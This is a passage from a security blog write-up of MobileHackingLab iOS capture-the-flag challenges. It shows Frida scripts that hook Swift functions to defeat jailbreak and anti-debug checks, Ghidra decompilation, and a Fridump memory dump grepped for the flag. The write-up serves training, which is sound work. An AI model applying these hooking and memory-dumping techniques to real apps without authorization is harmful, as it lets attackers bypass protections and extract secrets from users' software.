    <span class="p">});</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
  <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Hooking Swift method failed!</span><span class="dl">"</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Let’s run this script with Frida and get our Flag:</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">D:\Testing</span><span class="w"> </span><span class="nx">Tools\Frida\IOS</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">frida</span><span class="w"> </span><span class="nt">-H</span><span class="w"> </span><span class="nx">192.168.1.11</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="nx">com.mobilehackinglab.No-Escape</span><span class="w"> </span><span class="nt">-l</span><span class="w"> </span><span class="o">.</span><span class="nx">\NoEscape.js</span><span class="w">
     </span><span class="err">____</span><span class="w">
    </span><span class="n">/</span><span class="w"> </span><span class="nx">_</span><span class="w">  </span><span class="o">|</span><span class="w">   </span><span class="n">Frida</span><span class="w"> </span><span class="nx">16.5.6</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">A</span><span class="w"> </span><span class="nx">world-class</span><span class="w"> </span><span class="nx">dynamic</span><span class="w"> </span><span class="nx">instrumentation</span><span class="w"> </span><span class="nx">toolkit</span><span class="w">
   </span><span class="o">|</span><span class="w"> </span><span class="p">(</span><span class="err">_</span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="w">
    </span><span class="err">&gt;</span><span class="w"> </span><span class="err">_</span><span class="w">  </span><span class="o">|</span><span class="w">   </span><span class="n">Commands:</span><span class="w">
   </span><span class="nx">/_/</span><span class="w"> </span><span class="o">|</span><span class="err">_</span><span class="o">|</span><span class="w">       </span><span class="n">help</span><span class="w">      </span><span class="o">-</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Displays</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">help</span><span class="w"> </span><span class="nx">system</span><span class="w">
   </span><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="w">       </span><span class="n">object</span><span class="nf">?</span><span class="w">   </span><span class="o">-</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Display</span><span class="w"> </span><span class="nx">information</span><span class="w"> </span><span class="nx">about</span><span class="w"> </span><span class="s1">'object'</span><span class="w">
   </span><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="w">       </span><span class="nx">exit/quit</span><span class="w"> </span><span class="o">-</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Exit</span><span class="w">
   </span><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="w">
   </span><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="w">   </span><span class="n">More</span><span class="w"> </span><span class="nx">info</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">https://frida.re/docs/home/</span><span class="w">
   </span><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="w">
   </span><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="w">   </span><span class="n">Connected</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">192.168.1.11</span><span class="w"> </span><span class="p">(</span><span class="n">id</span><span class="o">=</span><span class="n">socket</span><span class="err">@</span><span class="nx">192.168.1.11</span><span class="p">)</span><span class="w">
</span><span class="n">Spawned</span><span class="w"> </span><span class="se">`c</span><span class="nx">om.mobilehackinglab.No-Escape</span><span class="se">`.</span><span class="w"> </span><span class="nx">Resuming</span><span class="w"> </span><span class="nx">main</span><span class="w"> </span><span class="nx">thread</span><span class="o">!</span><span class="w">
</span><span class="p">[</span><span class="n">Remote</span><span class="p">::</span><span class="n">com.mobilehackinglab.No</span><span class="nt">-Escape</span><span class="w"> </span><span class="p">]</span><span class="o">-</span><span class="err">&gt;</span><span class="w"> </span><span class="n">Returned</span><span class="w"> </span><span class="nx">Swift</span><span class="w"> </span><span class="nx">value:</span><span class="w"> </span><span class="nx">0x1</span><span class="w">
</span><span class="n">Modefied</span><span class="w"> </span><span class="nx">Return</span><span class="w"> </span><span class="nx">Swift</span><span class="w"> </span><span class="nx">value</span><span class="w"> </span><span class="nx">TO:</span><span class="w">  </span><span class="nx">0x0</span><span class="w">
</span></pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/MHL/IMG_0027.png" alt="IMG_0027.PNG" height="600" /></p><h2 id="captain-nohook"><strong>Captain Nohook</strong></h2><p><strong>Description</strong></p><blockquote><p>This challenge focuses on a fictitious app called Captain No Hook, which implements advanced anti-debugging / jailbreak detection techniques. Your objective is to bypass these protections and retrieve the hidden flag within the app.</p></blockquote><p><strong>Objective</strong></p><blockquote><p>Your task is to overcome the protection mechanisms implemented in the Captain NoHook app to reveal the hidden flag.</p></blockquote><p>App package Name: <code class="language-plaintext highlighter-rouge">com.mobilehackinglab.Captain-Nohook</code></p><p>Let’s examine the application:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/MHL/IMG_0028.png" alt="IMG_0028.PNG" height="600" /></p><p>Once the flag button is clicked, the app displays the following message and closes:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/MHL/IMG_0029.png" alt="IMG_0029.PNG" height="600" /></p><p>Let’s analyze the applications function with Ghidra and Search for the encountered string:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/MHL/image%205.png" alt="image.png" /></p><p>This string is part of the <code class="language-plaintext highlighter-rouge">_$s14Captain_Nohook14ViewControllerC7getFlagSSyF</code> function. And this message is being shown if the return value of the <code class="language-plaintext highlighter-rouge">_$s14Captain_Nohook22is_noncompliant_deviceSbyF()</code> is an even number:</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre><span class="k">if</span> <span class="p">((</span><span class="n">isNonCompliantDeviceCheckValue</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">local_1c8</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">_</span><span class="err">$</span><span class="n">sSo17UIAlertControllerCMa</span><span class="p">();</span>
    <span class="n">NoncompliantToastMessage</span> <span class="o">=</span> <span class="s">"Noncompliant device detected!"</span><span class="p">;</span>
    <span class="n">iVar19</span> <span class="o">=</span> <span class="mh">0x1d</span><span class="p">;</span>
    <span class="n">local_1b4</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">_</span><span class="err">$</span><span class="n">sSS21_builtinStringLiteral17utf8CodeUnitCount7isASCIISSBp_BwBi1_tcfC</span>
              <span class="p">(</span><span class="s">"Noncompliant device detected!"</span><span class="p">,</span><span class="mh">0x1d</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
    <span class="n">pcVar6</span> <span class="o">=</span> <span class="s">"Yerr hook won</span><span class="se">\'</span><span class="s">t work!"</span><span class="p">;</span>
    <span class="n">iVar13</span> <span class="o">=</span> <span class="mh">0x15</span><span class="p">;</span>
    <span class="n">local_1d8</span> <span class="o">=</span> <span class="n">NoncompliantToastMessage</span><span class="p">;</span>
    <span class="n">local_1d0</span> <span class="o">=</span> <span class="n">iVar19</span><span class="p">;</span>
    <span class="n">_</span><span class="err">$</span><span class="n">sSS21_builtinStringLiteral17utf8CodeUnitCount7isASCIISSBp_BwBi1_tcfC</span>
              <span class="p">(</span><span class="s">"Yerr hook won</span><span class="se">\'</span><span class="s">t work!"</span><span class="p">,</span><span class="mh">0x15</span><span class="p">,</span><span class="n">local_1b4</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">);</span>
    <span class="n">local_1b0</span> <span class="o">=</span> <span class="n">_</span><span class="err">$</span><span class="n">sSo17UIAlertControllerC5title7message14preferredStyleABSSSg_AFSo0abF0VtcfCTO</span>
                          <span class="p">(</span><span class="n">local_1d8</span><span class="p">,</span><span class="n">local_1d0</span><span class="p">,</span><span class="n">pcVar6</span><span class="p">,</span><span class="n">iVar13</span><span class="p">);</span>
    <span class="n">_</span><span class="err">$</span><span class="n">sSo13UIAlertActionCMa</span><span class="p">();</span>
    <span class="n">NoncompliantToastMessage</span> <span class="o">=</span> <span class="s">"OK"</span><span class="p">;</span>
    <span class="n">iVar19</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
    <span class="n">_</span><span class="err">$</span><span class="n">sSS21_builtinStringLiteral17utf8CodeUnitCount7isASCIISSBp_BwBi1_tcfC</span><span class="p">(</span><span class="s">"OK"</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">local_1b4</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">);</span>
    <span class="n">local_1c0</span> <span class="o">=</span> <span class="n">_</span><span class="err">$</span><span class="n">sSo13UIAlertActionC5title5style7handlerABSSSg_So0aB5StyleVyABcSgtcfCTO</span>
                          <span class="p">(</span><span class="n">NoncompliantToastMessage</span><span class="p">,</span><span class="n">iVar19</span><span class="p">,</span><span class="n">local_1c8</span><span class="p">,</span><span class="mh">0x1000097cc</span><span class="p">,</span><span class="n">local_1c8</span><span class="p">);</span>
    <span class="n">_objc_msgSend</span><span class="p">(</span><span class="n">local_1b0</span><span class="p">,</span><span class="s">"addAction:"</span><span class="p">);</span>
    <span class="n">_objc_release</span><span class="p">(</span><span class="n">local_1c0</span><span class="p">);</span>
    <span class="n">_objc_msgSend</span><span class="p">(</span><span class="n">unaff_x20</span><span class="p">,</span><span class="s">"presentViewController:animated:completion:"</span><span class="p">,</span><span class="n">local_1b0</span><span class="p">,</span><span class="n">local_1b4</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">_objc_release</span><span class="p">(</span><span class="n">local_1b0</span><span class="p">);</span>
  <span class="p">}</span>
</pre></table></code></div></div><p>So, let’s bypass this by changing the return value of this Swift function using the following script:</p><div class="language-javascript highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="kd">var</span> <span class="nx">myMethod</span> <span class="o">=</span> <span class="nx">Module</span><span class="p">.</span><span class="nf">findExportByName</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="dl">"</span><span class="s2">$s14Captain_Nohook22is_noncompliant_deviceSbyF</span><span class="dl">"</span><span class="p">);</span>

<span class="k">if </span><span class="p">(</span><span class="nx">myMethod</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">Interceptor</span><span class="p">.</span><span class="nf">attach</span><span class="p">(</span><span class="nx">myMethod</span><span class="p">,</span> <span class="p">{</span>
        <span class="na">onLeave</span><span class="p">:</span> <span class="nf">function </span><span class="p">(</span><span class="nx">retval</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Returned Swift value:</span><span class="dl">"</span><span class="p">,</span> <span class="nx">retval</span><span class="p">);</span>
            <span class="c1">// You can inspect or modify retval here</span>
            <span class="nx">retval</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
            <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Modefied Return Swift value TO: </span><span class="dl">"</span><span class="p">,</span> <span class="nx">retval</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">});</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
  <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Hooking Swift method failed!</span><span class="dl">"</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>And the application opens, but without giving the flag? Hmm!</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/MHL/IMG_0030.png" alt="IMG_0030.PNG" height="600" /></p><p>Searching for the new string appeared, but it doesn’t lead to anything.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/MHL/image%206.png" alt="image.png" /></p><p>Reviewing the challenge description and app approach again, they said that the flag is going to be inside the application memory:</p><p>So let’s use Fridump tool to get the flag:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="nv">$ </span>frida-ps <span class="nt">-U</span> | <span class="nb">grep</span> <span class="s2">"hook"</span>
56716  Captain Nohook

<span class="nv">$ </span>python3 fridump.py <span class="nt">-U</span> <span class="s2">"Captain Nohook"</span>
        ______    _     _
        |  ___|  <span class="o">(</span>_<span class="o">)</span>   | |
        | |_ _ __ _  __| |_   _ _ __ ___  _ __
        |  _| <span class="s1">'__| |/ _` | | | | '</span>_ <span class="sb">`</span> _ <span class="se">\|</span> <span class="s1">'_ \
        | | | |  | | (_| | |_| | | | | | | |_) |
        \_| |_|  |_|\__,_|\__,_|_| |_| |_| .__/
                                         | |
                                         |_| 
Current Directory: /opt/fridump
Output directory is set to: /opt/fridump/dump
Starting Memory dump...
/opt/fridump/fridump.py:119: DeprecationWarning: Script.exports will become asynchronous in the future, use the explicit Script.exports_sync instead
  agent = script.exports
Progress: [################################################--] 95.74% Complete
Finished!
                                                                                  
$ cd dump                                                        
$ strings * | grep -i '</span>mhl<span class="o">{</span><span class="s1">'            
MHL{H00k_1n_Y0ur_D3bUgg3r}
</span></pre></table></code></div></div><h2 id="conclusion"><strong>Conclusion</strong></h2><p>I found those challenges very interesting, and I wanted to resume them, but unfortunately there was an error on the rest of them. Maybe because my iPhone testing device is very old, even though I have contacted the MobileHackingLab team, but with no response any way, I hope you enjoyed it PEACE!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ios-security/'>IOS Security</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ios-security/" class="post-tag no-text-decoration" >ios security</a> <a href="/tags/writeups/" class="post-tag no-text-decoration" >writeups</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=MobileHackingLab IOS Challenges Writeups - Muhammad Adel&url=https://itsfading.github.io/posts/Mobile-Hacking-Lab-IOS-Challenges-Writeups/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=MobileHackingLab IOS Challenges Writeups - Muhammad Adel&u=https://itsfading.github.io/posts/Mobile-Hacking-Lab-IOS-Challenges-Writeups/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=MobileHackingLab IOS Challenges Writeups - Muhammad Adel&url=https://itsfading.github.io/posts/Mobile-Hacking-Lab-IOS-Challenges-Writeups/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/CRTP-Commands-CheatSheet/">CRTP Commands CheatSheet</a><li><a href="/posts/Active-Directory-Authentication/">Active Directory Authentication</a><li><a href="/posts/Mobile-Hacking-Lab-IOS-Challenges-Writeups/">MobileHackingLab IOS Challenges Writeups</a><li><a href="/posts/Active-Directory-Basics/">Active Directory Basics</a><li><a href="/posts/Cybertalents-Shadower-Machine-Writeup/">Cybertalents Shadower Machine Writeup</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/cybertalents/">cybertalents</a> <a class="post-tag" href="/tags/writeups/">writeups</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/redteaming/">redteaming</a> <a class="post-tag" href="/tags/android-security/">android security</a> <a class="post-tag" href="/tags/bug-hunting/">bug hunting</a> <a class="post-tag" href="/tags/machines/">machines</a> <a class="post-tag" href="/tags/android-security/">Android Security</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/I-owe-your-Request-HTTP-Request-Smuggling-leads-to-Full-Accounts-takeover/"><div class="card-body"> <span class="timeago small" > Aug 29, 2021 <i class="unloaded">2021-08-29T19:40:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>I owe your Request | HTTP Request Smuggling leads to Full Accounts takeover</h3><div class="text-muted small"><p> Introduction Peace be upon you all, this is actually my first writeup which is going to be about a very interesting vulnerability, HTTP Request Smuggling, which I found in a private program, which ...</p></div></div></a></div><div class="card"> <a href="/posts/Unrestricted-File-Upload-Leads-to-SSRF-and-RCE/"><div class="card-body"> <span class="timeago small" > Oct 11, 2021 <i class="unloaded">2021-10-11T19:40:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Unrestricted File Upload Leads to SSRF and RCE</h3><div class="text-muted small"><p> Introduction Peace be upon you all, I am going to share with you a vulnerability that I have found almost a year ago and it is remarkable for me because it was the first critical one for me anyway ...</p></div></div></a></div><div class="card"> <a href="/posts/Hackerone-Android-challenges-Writeup/"><div class="card-body"> <span class="timeago small" > Mar 7, 2022 <i class="unloaded">2022-03-07T16:40:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackerone Android Challenges Writeups</h3><div class="text-muted small"><p> Peace be upon all of you, on this writeup I am going to cover the solutions of all android challenges on Hackerone (Thermostat - Intentional Exercise - Oauthbreaker - Webdev). Difficulty: Easy and...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/HexTree-Attack-Surface-App-Solutions/" class="btn btn-outline-primary" prompt="Older"><p>HexTree Attack Surface Android App Solutions</p></a> <a href="/posts/CRTP-Commands-CheatSheet/" class="btn btn-outline-primary" prompt="Newer"><p>CRTP Commands CheatSheet</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://twitter.com/ItsFadinG_">Muhammad Adel</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by Passion and Enthusiasm</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/cybertalents/">cybertalents</a> <a class="post-tag" href="/tags/writeups/">writeups</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/redteaming/">redteaming</a> <a class="post-tag" href="/tags/android-security/">android security</a> <a class="post-tag" href="/tags/bug-hunting/">bug hunting</a> <a class="post-tag" href="/tags/machines/">machines</a> <a class="post-tag" href="/tags/android-security/">Android Security</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://itsfading.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
